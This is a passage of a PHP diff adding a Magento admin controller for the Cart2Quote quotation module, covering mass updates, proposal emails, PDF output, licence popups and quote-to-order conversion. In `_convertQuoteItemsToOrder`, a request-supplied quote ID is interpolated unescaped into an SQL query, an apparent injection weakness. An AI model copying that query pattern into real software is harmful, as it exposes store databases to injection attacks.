+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_massStatus', ['quote' => $qquote]);
+                }
+
+                $this->_getSession()->addSuccess(
+                    Mage::helper('adminhtml')->__('Total of %d record(s) were updated', count($qquoteIds))
+                );
+            } catch (Exception $e) {
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                $this->_getSession()->addError($e->getMessage());
+            }
+        }
+
+        $this->_redirect('*/*/index');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massStatus_after', [$qquoteIds]);
+    }
+
+    /**
+     * Mass Follow Up Update
+     *
+     * Updates follow up date for
+     * selected quotes. If no valid date
+     * is given, date is set to null
+     */
+    public function massFollowupAction()
+    {
+        $qquoteIds = $this->getRequest()->getParam('qquote');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massFollowup_before', [$qquoteIds]);
+
+        if (!is_array($qquoteIds)) {
+            Mage::getSingleton('adminhtml/session')->addError(Mage::helper('catalog')->__('Please select items.'));
+        } else {
+            try {
+                foreach ($qquoteIds as $qquoteId) {
+
+                    if (strtotime($this->getRequest()->getParam('followup'))) {
+                        $qquote = Mage::getSingleton('qquoteadv/qqadvcustomer')
+                            ->load($qquoteId)
+                            ->setFollowup($this->getRequest()->getParam('followup'))
+                            ->setIsMassupdate(true)
+                            ->save();
+                        Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_massFollowup', ['quote' => $qquote]);
+                    } else {
+                        $qquote = Mage::getSingleton('qquoteadv/qqadvcustomer')
+                            ->load($qquoteId)
+                            ->setFollowup()
+                            ->setIsMassupdate(true)
+                            ->save();
+                        Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_massFollowup', ['quote' => $qquote]);
+                    }
+                }
+                $this->_getSession()->addSuccess(
+                    Mage::helper('adminhtml')->__('Total of %d record(s) were updated', count($qquoteIds))
+                );
+            } catch (Exception $e) {
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                $this->_getSession()->addError($e->getMessage());
+            }
+        }
+
+        $this->_redirect('*/*/index');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massFollowup_after', [$qquoteIds]);
+    }
+
+    /**
+     * Mass update action (used in the grid)
+     */
+    public function massUpdateAction()
+    {
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massUpdate_before', [$this->getRequest()->getParam('ranges')]);
+
+        // Check for a valid Enterprise License
+        if (Mage::helper('qquoteadv/license')->validLicense('mass_update_quote_requests')) { //not allowed in trial mode
+            if ($this->getRequest()->isXmlHttpRequest()) {
+                Mage::getModel('qquoteadv/massupdate')->startMassUpdateAllowedToQuote($this->getRequest()->getParam('quote_mode'), $this->getRequest()->getParam('ranges'));
+            }
+        } else {
+            $message = $this->__("This function is only available in the enterprise (non-trial) edition. <a href='https://www.cart2quote.com/magento-quotation-module-pricing.html'>Upgrade</a>");
+            Mage::getSingleton('adminhtml/session')->addNotice($message);
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massUpdate_after', [$this->getRequest()->getParam('ranges')]);
+    }
+
+    /**
+     * Send email to client to informing about the quote proposition
+     * @param array $params customer address
+     * @return string
+     */
+    public function sendEmail($params)
+    {
+        //Create an array of variables to assign to template
+        $vars = [];
+
+        $this->quoteId = (int)$this->getRequest()->getParam('id');
+        /* @var Ophirah_Qquoteadv_Model_Qqadvcustomer $_quoteadv */
+        $_quoteadv = $this->getQuotationQuote($this->quoteId);
+
+        $quoteItems = Mage::getModel('qquoteadv/qqadvproduct')->getCollection()
+            ->addFieldToFilter('quote_id', $this->quoteId)
+            ->load();
+
+        // check items
+        $errorMsg = [];
+        $errors = [];
+        foreach ($quoteItems as $quoteItem) {
+            $check = Mage::helper('qquoteadv')->isInStock($quoteItem->getData('product_id'));
+            if ($check->getData('has_error')) {
+                $errors[] = $check->getData('message');
+            }
+        }
+
+        //#return back in case any error found
+        if (count($errors)) {
+            $errorMsg = array_merge($errorMsg, $errors);
+            foreach ($errorMsg as $message) {
+                Mage::getSingleton('adminhtml/session')->addError($message);
+            }
+        }
+
+        $vars['quote'] = $_quoteadv;
+        $vars['customer'] = Mage::getModel('customer/customer')->load($_quoteadv->getCustomerId());
+        $vars['store'] = Mage::app()->getStore($_quoteadv->getStoreId());
+
+        $template = Mage::helper('qquoteadv/email')->getEmailTemplateModel($_quoteadv->getStoreId());
+
+        // Default template
+        $quoteadv_param = Mage::getStoreConfig('qquoteadv_quote_emails/templates/proposal', $_quoteadv->getStoreId());
+        // Get the checkout URL template
+        if (Mage::getStoreConfig('qquoteadv_advanced_settings/checkout/checkout_alternative', $_quoteadv->getData('store_id')) && $_quoteadv->getData('alt_checkout')) {
+            $quoteadv_param = Mage::getStoreConfig('qquoteadv_advanced_settings/checkout/checkout_alternative_email', $_quoteadv->getStoreId());
+        }
+
+        $disabledEmail = Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL;
+        if ($quoteadv_param != $disabledEmail){
+            if ($quoteadv_param) {
+                $templateId = $quoteadv_param;
+            } else {
+                $templateId = self::XML_PATH_QQUOTEADV_REQUEST_PROPOSAL_EMAIL_TEMPLATE;
+            }
+
+            // get locale of quote sent so we can sent email in that language	
+            $storeLocale = Mage::getStoreConfig('general/locale/code', $_quoteadv->getStoreId());
+
+            if (is_numeric($templateId)) {
+                $template->load($templateId);
+            } else {
+                $template->loadDefault($templateId, $storeLocale);
+            }
+
+            $vars['attach_pdf'] = $vars['attach_doc'] = false;
+
+            //Create pdf to attach to email
+            if (Mage::getStoreConfig('qquoteadv_quote_emails/attachments/pdf', $_quoteadv->getStoreId())) {
+                $_quoteadv->_saveFlag = true;
+
+                //totals need to be collected before generating the pdf (until we save the totals in the database)
+                $_quoteadv->collectTotals();
+
+                $pdf = Mage::getModel('qquoteadv/pdf_qquote')->getPdf($_quoteadv);
+                $_quoteadv->_saveFlag = false;
+                $realQuoteadvId = $_quoteadv->getIncrementId() ? $_quoteadv->getIncrementId() : $_quoteadv->getId();
+                try {
+                    $file = $pdf->render();
+                    $name = Mage::helper('qquoteadv')->__('Price_proposal_%s', $realQuoteadvId);
+                    $template->getMail()->createAttachment($file, 'application/pdf', Zend_Mime::DISPOSITION_ATTACHMENT, Zend_Mime::ENCODING_BASE64, $name . '.pdf');
+                    $vars['attach_pdf'] = true;
+                } catch (Exception $e) {
+                    Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                }
+
+            }
+            //Check if attachment needs to be sent with email
+            $doc = Mage::getStoreConfig('qquoteadv_quote_emails/attachments/doc', $_quoteadv->getStoreId());
+            if ($doc) {
+                $pathDoc = Mage::getBaseDir(Mage_Core_Model_Store::URL_TYPE_MEDIA) . DS . 'quoteadv' . DS . $doc;
+                try {
+                    $file = file_get_contents($pathDoc);
+                    $mimeType = Mage::helper('qquoteadv/file')->getMimeType($pathDoc);
+
+                    $info = pathinfo($pathDoc);
+                    //$extension = $info['extension']; 
+                    $basename = $info['basename'];
+                    $template->getMail()->createAttachment($file, $mimeType, Zend_Mime::DISPOSITION_ATTACHMENT, Zend_Mime::ENCODING_BASE64, $basename);
+                    $vars['attach_doc'] = true;
+                } catch (Exception $e) {
+                    Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                }
+            }
+            //Get remark
+            $remark = Mage::getStoreConfig('qquoteadv_quote_configuration/proposal/qquoteadv_remark', $_quoteadv->getStoreId());
+            if ($remark) {
+                $remark = nl2br($remark);
+                $vars['remark'] = $remark;
+            }
+
+            $adm_name = $this->getAdminName($_quoteadv->getUserId());
+            $adm_name = trim($adm_name);
+            if (empty($adm_name)) {
+                $adm_name = $this->getAdminName(Mage::getSingleton('admin/session')->getUser()->getId());
+            }
+            if (!empty($adm_name)) {
+                $vars['adminname'] = $adm_name;
+            }
+
+            $vars['link'] = Mage::helper('qquoteadv/licensechecks')->getAutoLoginUrl($_quoteadv, 2);
+
+            $sender = $_quoteadv->getEmailSenderInfo();
+            $template->setSenderName($sender['name']);
+            $template->setSenderEmail($sender['email']);
+
+            $bcc = Mage::getStoreConfig('qquoteadv_quote_emails/sales_representatives/bcc', $_quoteadv->getStoreId());
+            if ($bcc) {
+                $bccData = explode(";", $bcc);
+                $template->addBcc($bccData);
+            }
+
+            if ((bool)Mage::getStoreConfig('qquoteadv_quote_emails/sales_representatives/send_linked_sale_bcc', $_quoteadv->getStoreId())
+                && Mage::helper('qquoteadv/licensechecks')->isAllowedSalesBcc()) {
+                $template->addBcc(Mage::getModel('admin/user')->load($_quoteadv->getUserId())->getEmail());
+            }
+
+            $template->setDesignConfig(['store' => $_quoteadv->getStoreId()]);
+
+            /**
+             * Opens the qquote_request.html, throws in the variable array
+             * and returns the 'parsed' content that you can use as body of email
+             */
+            //emulate quote store for corret email design
+            $appEmulation = Mage::getSingleton('core/app_emulation');
+            $initialEnvironmentInfo = $appEmulation->startEnvironmentEmulation($_quoteadv->getStoreId());
+
+            //generate template getProcessedTemplate is called inside send
+            $template->setData('c2qParams', $params);
+            Mage::dispatchEvent('ophirah_qquoteadv_addSendMail_before', ['template' => $template]);
+            $res = $template->send($params['email'], $params['name'], $vars);
+            Mage::dispatchEvent('ophirah_qquoteadv_addSendMail_after', ['template' => $template, 'result' => $res]);
+
+            // Stop store emulation process
+            $appEmulation->stopEnvironmentEmulation($initialEnvironmentInfo);
+
+            return $res;
+
+        }
+
+        Mage::getSingleton('adminhtml/session')->addError("Quote email is disabled");
+        return $disabledEmail;
+    }
+
+    /**
+     * Send email to the new sales represent when saving the quote
+     * @param $_quoteadv
+     * @param $saveas
+     */
+    public function sendEmailSalesRep($_quoteadv, $saveas)
+    {
+        $emailAddresses = $saveas->getEmail();
+        if (!empty($emailAddresses)) {
+            $emailAddresses = array_filter(explode(';', $emailAddresses));
+
+            $template = Mage::helper('qquoteadv/email')->getEmailTemplateModel($_quoteadv->getStoreId());
+
+            $disabledEmail = Ophirah_Qquoteadv_Model_System_Config_Source_Email_Templatedisable::VALUE_DISABLED_EMAIL;
+            $quoteadv_param = Mage::getStoreConfig('qquoteadv_quote_emails/templates/quote_request_notification', $_quoteadv->getStoreId());
+
+            if ($quoteadv_param != $disabledEmail && count($emailAddresses) > 0) {
+
+                //Vars into email templates
+                $vars = [
+                    'quoteUrl' => Mage::helper("adminhtml")->getUrl("adminhtml/redirect/quoteEdit", ['id' => $_quoteadv->getId()]),
+                    'quote' => Mage::getModel('qquoteadv/qqadvcustomer')->load($_quoteadv->getId()),
+                    'customer' => Mage::getModel('customer/customer')->load($_quoteadv->getCustomerId()),
+                    'quoteId' => $_quoteadv->getId()
+                ];
+
+
+                if ($quoteadv_param) {
+                    $templateId = $quoteadv_param;
+                } else {
+                    $templateId = self::XML_PATH_QQUOTEADV_REQUEST_EMAIL_TEMPLATE;
+                }
+                if (is_numeric($templateId)) {
+                    $template->load($templateId);
+                } else {
+                    $template->loadDefault($templateId);
+                }
+
+                $sender = $_quoteadv->getEmailSenderInfo();
+                $template->setSenderName($sender['name']);
+                $template->setSenderEmail($sender['email']);
+
+                //getProcessedTemplate is called inside  $template->send
+                //$template->getProcessedTemplate($vars);
+
+                Mage::dispatchEvent('ophirah_qquoteadv_addSendMail_before', ['template' => $template]);
+                $res = $template->send($emailAddresses, null, $vars);
+                Mage::dispatchEvent('ophirah_qquoteadv_addSendMail_after', ['template' => $template, 'result' => $res]);
+                if (empty($res)) {
+                    $message = Mage::helper('Ophirah_RequestNotification')->__("Qquote request email notification was't sent quote #%s", $_quoteadv->getId());
+                    Mage::log('Exception: RequestNotification: ' . $message, null, 'c2q_exception.log', true);
+                }
+            }
+        }
+    }
+
+    /**
+     * Add quote comment action
+     *
+     * @depricated
+     */
+    public function addCommentAction()
+    {
+        $qquoteadv = $this->_initQuoteadv();
+        if ($qquoteadv) {
+            try {
+                $response = false;
+                $data = $this->getRequest()->getPost('history');
+
+                Mage::dispatchEvent('ophirah_qquoteadv_admin_addComment_before', [$data]);
+
+                //seems not used?
+                //$comment = trim(strip_tags($data['comment']));
+
+                $this->loadLayout('empty');
+                $this->renderLayout();
+            } catch (Mage_Core_Exception $e) {
+                $response = [
+                    'error' => true,
+                    'message' => $e->getMessage(),
+                ];
+            } catch (Exception $e) {
+                $response = [
+                    'error' => true,
+                    'message' => $this->__('Can not add quote history.')
+                ];
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+            }
+            if (is_array($response)) {
+                $response = Zend_Json::encode($response);
+                $this->getResponse()->setBody($response);
+            }
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_addComment_after', []);
+    }
+
+    /**
+     * Initialize qquoteadv model instance
+     *
+     * @return Quote|bool
+     */
+    protected function _initQuoteadv()
+    {
+        $id = $this->getRequest()->getParam('quote_id');
+        $qquoteadv = $this->getQuotationQuote($id);
+
+        if (!$qquoteadv->getId()) {
+            $this->_getSession()->addError($this->__('This quote no longer exists.'));
+            $this->_redirect('*/*/');
+            $this->setFlag('', self::FLAG_NO_DISPATCH, true);
+            return false;
+        }
+
+        Mage::register('qquote_data', $qquoteadv);
+
+        return $qquoteadv;
+    }
+
+    /**
+     * Function that generates the PDF for a given quote
+     *
+     * @return null
+     */
+    public function pdfqquoteadvAction()
+    {
+        $errorMsg = [];
+        $errors = [];
+
+        // From Print button, save quote first
+        if ($this->getRequest()->getPost() && $this->_saveFlag === false) {
+            $this->setFlag('qquoteadv', 'print', true);
+            $this->_postData = $this->getRequest()->getPost();
+            $save = $this->saveAction();
+            if (!empty($save) && !is_object($save)) {
+                $errors = $save;
+            }
+            $this->setFlag('qquoteadv', 'print', false);
+        }
+
+        $quoteadvId = $this->getRequest()->getParam('id');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_pdfqquoteadv_before', [$quoteadvId]);
+
+        $flag = false;
+        if (!empty($quoteadvId) && !$errors) {
+            $_quoteadv = $this->getQuotationQuote($quoteadvId);
+            $quoteItems = Mage::getModel('qquoteadv/qqadvproduct')->getCollection()
+                ->addFieldToFilter('quote_id', $quoteadvId)
+                ->load();
+
+            // check items
+            foreach ($quoteItems as $quoteItem) {
+                $check = Mage::helper('qquoteadv')->isInStock($quoteItem->getData('product_id'));
+                if ($check->getData('has_error')) {
+                    $errors[] = $check->getData('message');
+                }
+            }
+
+            if (count($errors) < 1) {
+
+                if ($quoteItems->getSize()) {
+                    $flag = true;
+                    if (!isset($pdf)) {
+                        $_quoteadv->collectTotals();
+                        $pdf = Mage::getModel('qquoteadv/pdf_qquote')->getPdf($_quoteadv);
+                    } else {
+                        $pages = Mage::getModel('qquoteadv/pdf_qquote')->getPdf($quoteItems);
+                        $pdf->pages = array_merge($pdf->pages, $pages->pages);
+                    }
+                }
+
+                if ($flag && isset($pdf)) {
+                    $realQuoteadvId = $_quoteadv->getIncrementId();
+                    $fileName = Mage::helper('qquoteadv')->__('Price_proposal_%s', $realQuoteadvId);
+
+                    return $this->_prepareDownloadResponse($fileName . '.pdf', $pdf->render(), 'application/pdf');
+                } else {
+                    $this->_getSession()->addError($this->__('There are no printable documents related to selected quotes'));
+                    $this->_redirect('*/*/');
+                }
+            }
+        }
+
+        //#return back in case any error found
+        if (count($errors)) {
+            $urlReturn = '*/*/edit/id/' . $quoteadvId;
+            $errorMsg = array_merge($errorMsg, $errors);
+            foreach ($errorMsg as $message) {
+                Mage::getSingleton('adminhtml/session')->addError($message);
+            }
+        }
+
+        if (!isset($urlReturn) || empty($urlReturn)) {
+            $urlReturn = '*/*/';
+        }
+        $this->_redirect($urlReturn);
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_pdfqquoteadv_after', [$quoteadvId]);
+        return null;
+    }
+
+    /**
+     * Function that returns if this installation is a trial version of Cart2Quote
+     *
+     * @param null $createHash
+     * @return mixed
+     */
+    final public function isTrialVersion($createHash = null)
+    {
+        return Mage::helper('qquoteadv/license')->isTrialVersion($createHash);
+    }
+
+    /**
+     * Function that generates the update/trial message in the quote edit screen
+     *
+     * @param bool|false $updateMsg
+     * @param int $storeId
+     * @return string
+     */
+    public function getMsgToUpgrade($updateMsg = false, $storeId = 0)
+    {
+        $createHash = Mage::registry('createHash');
+
+        $msg = '
+        <style>
+
+        #quoteadv-box-header {
+
+        }
+        .leightbox1 .text {
+
+        }
+        #overlay, #overlaylink{
+            display:none;
+            position:absolute;
+            top:0;
+            left:0;
+            width:100%;
+            height:200%;
+            z-index:1000;
+            background-color:#333;
+            -moz-opacity: 0.8;
+            opacity:.80;
+            filter: alpha(opacity=80);
+        }
+
+        </style>
+
+        <script type="text/javascript">
+        function prepareIE(height, overflow) {
+            bod = document.getElementsByTagName(\'body\')[0];
+            bod.style.height = height;
+            bod.style.overflow = overflow;
+    
+            htm = document.getElementsByTagName(\'html\')[0];
+            htm.style.height = height;
+            htm.style.overflow = overflow;
+        }
+
+        function initMsg() {
+            bod 				= document.getElementsByTagName(\'body\')[0];
+            overlay 			= document.createElement(\'div\');
+            overlay.id			= \'overlay\';
+            bod.appendChild(overlay);
+            $(\'overlay\').style.display = \'block\';
+            $(\'lightbox1\').style.display = \'block\';
+            prepareIE("auto", "auto");
+        }
+
+        function hideBox() {
+            $(\'lightbox1\').style.display = \'none\';
+            $(\'overlay\').style.display = \'none\';
+        }
+
+        </script>';
+
+        $headerText = "";
+        $onClick = 'hideBox()';
+        $openingDiv = "";
+        $closingDiv = "";
+        $btn1 = "";
+        $btn2 = "";
+        $btn3 = "";
+        $smallPrint = false;
+        $text = '';
+
+        //check what the situation is
+        if (Mage::helper('qquoteadv/licensechecks')->showFreeUserOptions()) {
+        //if ((true)) {
+            $expiry = Mage::helper('qquoteadv/license')->getC2QExpiryDate();
+            if ($expiry > date("Ymd")){
+                $expiryFormatted = "has been disabled";
+            } else {
+                $expiryFormatted = "has expired on " . substr($expiry, 6, 2) . "." . substr($expiry, 4, 2) . "." . substr($expiry, 0, 4);
+            }
+
+            $text = $this->__(Mage::helper('qquoteadv/licensechecks')->_expiryText, $expiryFormatted);
+            //$onClick = 'history.back()';
+            $onClick = 'hideBox()';
+
+            $headerText = $this->__('License Notice');
+            $openingDiv = '<div class="c2q-activate-popup">';
+            $closingDiv = '</div>';
+
+            $btn1 = '<button target="_blank" formtarget="_blank" class="button button2 floatleft" title="Contact Sales" onclick="document.location.href=\'https://cart2quotesales.zendesk.com/hc/en-us/requests/new\'">' . $this->__('Contact Sales') . '</button> ';
+            $btn2 = '<button target="_blank" formtarget="_blank" class="button button2 btn-prim" title="Editions and Pricing" onclick="document.location.href=\'https://www.cart2quote.com/magento-quotation-module-plans-pricing.html\'">' . $this->__('Editions and Pricing') . '</button> ';
+
+        } elseif ($this->isTrialVersion($createHash) && !$this->hasExpired()) {
+            $expiry = Mage::helper('qquoteadv/license')->getC2QExpiryDate();
+            $now = now();
+            $expiry = substr($expiry, 0, 4) . "-" . substr($expiry, 4, 2) . "-" . substr($expiry, 6, 2);
+            $diff = abs(strtotime($expiry) - strtotime($now));
+            $days = floor($diff / (60 * 60 * 24));
+            $headerText = $this->__('Development Trial');
+            $openingDiv = '<div class="c2q-activate-popup">';
+            $closingDiv = '</div>';
+            $daysToGo = sprintf("%d", $days);
+
+            $text = $this->__(Mage::helper('qquoteadv/licensechecks')->_trialText, $daysToGo);
+            $onClick = 'hideBox()';
+
+            $btn1 = '<button class="button button1 floatleft" title="Continue Trial" href="" onclick="' . $onClick . '">' . $this->__('Continue Trial') . '</button>';
+            $btn2 = '<button target="_blank" formtarget="_blank" class="button button2" title="Purchase a license" onclick="document.location.href=\'https://www.cart2quote.com/magento-quotation-module-pricing.html?utm_source=Client_Website&utm_medium=Popup_trialText&utm_campaign=Client_Website_Upgrade\'">' . $this->__('See Plans and Pricing') . '</button> ';
+        } elseif (!$this->checkQuoteLicense($storeId)) {
+            $text = $this->__(Mage::helper('qquoteadv/licensechecks')->_wrongLicenseText);
+            $onClick = 'history.back()';
+            $headerText = $this->__('Please Upgrade');
+            $openingDiv = '<div class="c2q-activate-popup">';
+            $closingDiv = '</div>';
+
+            $btn1 = '<button class="button button1" title="Continue" onclick="' . $onClick . '">' . $this->__('Not Now') . '</button>';
+            $btn2 = '<button target="_blank" formtarget="_blank" class="button button2" title="Upgrade" onclick="document.location.href=\'https://www.cart2quote.com/magento-quotation-module-pricing.html?utm_source=Client_Website&utm_medium=Popup_wrongLicenseText&utm_campaign=Client_Website_Upgrade\'">' . $this->__('See Plans and Pricing') . '</button> ';
+            $smallPrint = $this->__('<a href="https://www.cart2quote.com/ordering-licenses?utm_source=Client_Website&utm_medium=Popup_wrongLicenseText&utm_campaign=Client_Website_Upgrade" class="sublinkBottom">read more about licensing</a>');
+        }
+
+        $msg .= '<div id="lightbox1" class="leightbox1" style="display:none;">';
+        $msg .= $openingDiv;
+        $msg .= '   <div>';
+        $msg .= '           <a onclick="' . $onClick . '" id="quoteadv-box-header-close-btn"></a>';
+        $msg .= '<div class="text-content">';
+        $msg .= '       <div id="quoteadv-box-header">';
+        $msg .=             $headerText;
+        $msg .= '       </div>';
+        $msg .= '       <div class="text" >' . $text . '</div>';
+        if($smallPrint){
+            $msg .= '   <div class="smallprint" >' . $smallPrint . '</div>';
+        }
+        $msg .= '</div>';
+        $msg .= '<div class="button-container">';
+        $msg .=         $btn1;
+        $msg .=         $btn3;
+        $msg .=         $btn2;
+        $msg .= '</div>';
+        $msg .= $closingDiv;
+        $msg .= '    </div>';
+        $msg .= '</div>';
+
+        //add initMsg() javascript
+        $msg .= '<script type="text/javascript">document.observe(\'dom:loaded\', function(){
+                    initMsg();
+                 });</script>';
+
+        Mage::unregister('createHash');
+
+        //fallback for unfinished quotes
+        if (!is_array($createHash) || (empty($createHash[0]) && empty($createHash[1]))) {
+            if ($text == '') {
+                return '';
+            }
+        }
+
+        return $msg;
+    }
+
+    /**
+     * Check quote license for a given store
+     *
+     * @param $storeId
+     * @return mixed
+     */
+    final private function checkQuoteLicense($storeId)
+    {
+        return Mage::helper('qquoteadv/license')->checkQuoteLicense($storeId);
+    }
+
+    /**
+     * Get the access level from the license helper
+     *
+     * @param null $createHash
+     * @return mixed
+     */
+    final private function getAccessLevel($createHash = null)
+    {
+        return Mage::helper('qquoteadv/license')->getAccessLevel($createHash);
+    }
+
+    /**
+     * Check if trial has expired
+     *
+     * @return mixed
+     */
+    final private function hasExpired()
+    {
+        return Mage::helper('qquoteadv/license')->hasExpired();
+    }
+
+    /**
+     * Retrieve session object
+     *
+     * @return Mage_Adminhtml_Model_Session_Quote
+     */
+    protected function _getSession()
+    {
+        return Mage::getSingleton('adminhtml/session_quote');
+    }
+
+    /**
+     * Retrieve order create model
+     *
+     * @return Mage_Adminhtml_Model_Sales_Order_Create
+     */
+    protected function _getOrderCreateModel()
+    {
+        return Mage::getSingleton('adminhtml/sales_order_create');
+    }
+
+    /**
+     * Function that converts a quote to an order (backend)
+     *
+     * @param $quoteadvId
+     * @param $requestedItems
+     */
+    protected function _convertQuoteItemsToOrder($quoteadvId, $requestedItems)
+    {
+        //# build sql
+        $resource = Mage::getSingleton('core/resource');
+        $read = $resource->getConnection('core_read');
+        $tblProduct = $resource->getTableName('quoteadv_product');
+        $tblRequestItem = $resource->getTableName('quoteadv_request_item');
+
+        $sql = "SELECT * 
+                FROM $tblProduct p 
+                INNER JOIN $tblRequestItem i
+                  ON p.quote_id=i.quote_id 
+                  AND i.quoteadv_product_id=p.id
+                  AND p.quote_id=$quoteadvId";
+
+        if (count($requestedItems)) {
+            $requestedItemsInts = [];
+            foreach ($requestedItems as $index => $requestedItem) {
+                $requestedItemsInts[$index] = intval($requestedItem);
+            }
+
+            $items = implode(',', $requestedItemsInts);
+            $sql .= " AND i.request_id IN($items)";
+            $sql .= " ORDER BY p.sort_order ASC";
+        } else {
+            return;
+        }
+
+        //add items from quote to order
+        $data = $read->fetchAll($sql);
+        foreach ($data as $item) {
+            $productId = $item['product_id'];
+
+            $product = Mage::getModel('catalog/product')->load($productId);
+            //observer will check customPrice after add item to card/quote
+
+            $customPrice = $item['owner_cur_price'];
+
+            /** @var Ophirah_Qquoteadv_Model_Qqadvcustomer $_quote */
+            $_quote = $this->getQuotationQuote($quoteadvId);
+            $quoteStoreId = $_quote->getStoreId();
+            $priceContainsTax = Mage::helper('tax')->priceIncludesTax($quoteStoreId);
+            if ($priceContainsTax) {
+                //fallback for situations where getWebsite doesn't return a object
+                if (is_object(Mage::app()->getWebsite(true))) {
+                    $store = Mage::app()->getWebsite(true)->getDefaultGroup()->getDefaultStore();
+                } else {
+                    $store = Mage::app()->getStore('default');
+                    $message = 'Mage::app()->getWebsite(true) is not a object, fallback applied';
+                    Mage::log('Message: ' . $message, null, 'c2q.log');
+                }
+
+                /** @var \Mage_Tax_Model_Calculation $taxCalculation */
+                $taxCalculation = Mage::getModel('tax/calculation');
+                $customer = $_quote->getCustomer();
+                if ($customer) {
+                    $taxCalculation->setCustomer($customer);
+                }
+                $request = $taxCalculation->getRateOriginRequest($store);
+
+                //get tax percent
+                $taxClassId = $product->getTaxClassId();
+                $percent = $taxCalculation->getRate($request->setProductClassId($taxClassId));
+
+                //Magento needs default store tax here
+//                //get user tax on this quote
+//                if ($_quote->getCustomerTaxClassId()) {
+//                    $userRequest = $taxCalculation->getRateRequest(
+//                        $_quote->getShippingAddress(),
+//                        $_quote->getBillingAddress(),
+//                        $_quote->getCustomerTaxClassId(),
+//                        $store
+//                    );
+//
+//                    $percent = $taxCalculation->getRate($userRequest->setProductClassId($taxClassId));
+//                }
+
+                $quoteStore = Mage::getModel('core/store')->load($quoteStoreId);
+                /** @var \Mage_Tax_Model_Calculation $taxCalculation */
+                $taxCalculation = Mage::getModel('tax/calculation');
+                $customer = $_quote->getCustomer();
+                if ($customer) {
+                    $taxCalculation->setCustomer($customer);
+                }
+                //$request = $taxCalculation->getRateRequest(null, null, null, $quoteStore);
+                $request = $taxCalculation->getRateOriginRequest($quoteStore);
+                $taxClassId = $product->getTaxClassId();
+                $quotePercent = $taxCalculation->getRate($request->setProductClassId($taxClassId));
+
+//                //get user tax on this quote -- only store tax, no user tax yet
+//                if ($_quote->getCustomerTaxClassId()) {
+//                    $userRequest = $taxCalculation->getRateRequest(
+//                        $_quote->getShippingAddress(),
+//                        $_quote->getBillingAddress(),
+//                        $_quote->getCustomerTaxClassId(),
+//                        $_quote->getStore()
+//                    );
+//
+//                    $quotePercent = $taxCalculation->getRate($userRequest->setProductClassId($taxClassId));
+//                }
+
+                if ($percent != $quotePercent) {
+                    $customPrice = ($customPrice / (100 + $quotePercent)) * (100 + $percent);
+                }
+            }
+            Mage::register('customPrice', $customPrice);
+
+            if ($product->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE) {
+                $attr = [];
+                $attr[$productId] = @unserialize($item['attribute']);
+                $attr[$productId]['qty'] = (float)$item['request_qty'];
+                $this->_getOrderCreateModel()->addProducts($attr);
+            } else {
+                $params = @unserialize($item['attribute']);
+                $params['qty'] = (float)$item['request_qty'];
+
+                try {
+                    $params = Mage::helper('qquoteadv')->prepareFileOptions($params);
+                    $this->_getOrderCreateModel()->addProduct($product, $params);
+                } catch (Exception $e) {
+                    Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                }
+            }
+
+            Mage::unregister('customPrice');
+        }
+    }
+
+    /**
+     * @Description This function echos an article body of Cart2Quote Zendesk help center. @link https://cart2quote.zendesk.com
+     * @Return JSON array of articles
+     */
+    public function requestArticleAction()
+    {
+        echo Mage::helper('qquoteadv')->executeArticleRequest(); // Get array of articles
+    }
+
+    /**
+     * Action to convert a quote to an order
+     *
+     * params ([id] => 64, [q2o_serial] => array(109,110))
+     */
+    public function convertAction()
+    {
+        $quoteadvId = $this->getRequest()->getParam('id');
+        $requestedItems = $this->getRequest()->getParam('q2o');
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_convert_before', [$quoteadvId, $requestedItems]);
+
+        if (empty($requestedItems)) {
+            $requestedItems = $this->getRequest()->getParam('q2o_serial');
+            if (!empty($requestedItems)) {
+                $requestedItems = json_decode(base64_decode($requestedItems));
+            }
+        }
+
+        if ($requestedItems) {
+            foreach ($requestedItems as $k => $v) {
+                if (empty($v)) {
+                    unset($requestedItems[$k]);
+                }
+            }
+        }
+
+        if (!empty($quoteadvId)) {
+            /** @var Ophirah_Qquoteadv_Model_Qqadvcustomer $_quoteadv */
+            $_quoteadv = $this->getQuotationQuote($quoteadvId);
+            Mage::dispatchEvent(
+                'qquoteadv_qqadvcustomer_before_convert',
+                [
+                    'quote' => $_quoteadv,
+                    'requestItems' => $requestedItems
+                ]
+            );
+
+            $currencyCode = $_quoteadv->getData('currency');
+            $storeId = $_quoteadv->getStoreId();
+            $this->_getSession()->setStoreId((int)$storeId);
+
+            $customerId = (int)$_quoteadv->getCustomerId();
+            $customer = Mage::getModel('customer/customer')->load($customerId);
+            $this->_getSession()->setCustomerId($customerId);
+
+            // empty the quote before adding the items
+            $this->_getOrderCreateModel()->getQuote()->removeAllItems();
+
+            // get customer address
+            $helperAddress = Mage::helper('qquoteadv/address');
+            $customerAddresses = $helperAddress->buildQuoteAdresses($_quoteadv);
+
+            $this->_getOrderCreateModel()
+                ->getQuote()
+                ->setBillingAddress(
+                    $helperAddress->getQuoteAddress(
+                        $customer,
+                        $customerAddresses['billingAddress'],
+                        $storeId,
+                        Mage_Customer_Model_Address_Abstract::TYPE_BILLING
+                    )
+                );
+
+            $this->_getOrderCreateModel()
+                ->getQuote()
+                ->setShippingAddress(
+                    $helperAddress->getQuoteAddress(
+                        $customer,
+                        $customerAddresses['shippingAddress'],
+                        $storeId,
+                        Mage_Customer_Model_Address_Abstract::TYPE_SHIPPING
+                    )
+                );
+
